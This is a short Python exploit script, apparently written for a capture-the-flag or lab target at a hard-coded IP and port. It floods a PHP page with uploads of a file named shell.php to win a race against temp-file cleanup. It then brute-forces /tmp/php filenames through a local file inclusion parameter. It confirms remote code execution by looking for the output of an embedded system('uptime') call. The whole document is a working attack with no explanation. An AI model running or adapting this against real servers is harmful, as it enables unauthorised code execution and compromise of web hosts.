import itertools
import string
import sys

import requests

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(100):#4096):
    requests.post('http://44.197.231.105:3023/index.php?page=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    #print(''.join(fname))
    #exit(1)
    url = 'http://44.197.231.105:3023/index.php?page=/tmp/php' + ''.join(fname)
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')